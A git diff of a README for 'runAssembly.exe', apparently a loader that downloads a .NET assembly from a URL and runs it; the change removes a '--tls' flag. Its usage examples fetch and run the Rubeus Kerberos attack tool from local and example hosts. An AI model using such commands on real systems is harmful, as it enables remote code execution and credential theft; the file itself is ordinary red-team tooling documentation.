@@ -14,7 +14,7 @@ This tool must be compiled with C++17 standard support.
 ## Usage
 
 ```cmd
-.\runAssembly.exe --url <http://host:port/path> [--tls] [--] [extra_args]
+.\runAssembly.exe --url <http://host:port/path> [--] [extra_args]
 ```
 ![](./runAssembly.png)
 
@@ -23,7 +23,6 @@ This tool must be compiled with C++17 standard support.
 | Option | Description |
 |--------|-------------|
 | `--url` | Full URL to the assembly (http or https) |
-| `--tls` | Enable HTTPS/TLS (default: disabled) |
 | `--help` | Show help message |
 | `--` | Separator for extra arguments passed to the assembly |
 
@@ -36,7 +35,7 @@ This tool must be compiled with C++17 standard support.
 .\runAssembly.exe --url http://127.0.0.1:8000/rubeus.exe
 
 # Load assembly from HTTPS URL with TLS enabled
-.\runAssembly.exe --url https://example.com/rubeus.exe --tls
+.\runAssembly.exe --url https://example.com/rubeus.exe
 
 # Load assembly and pass arguments to it
 .\runAssembly.exe --url http://localhost/rubeus.exe -- klist
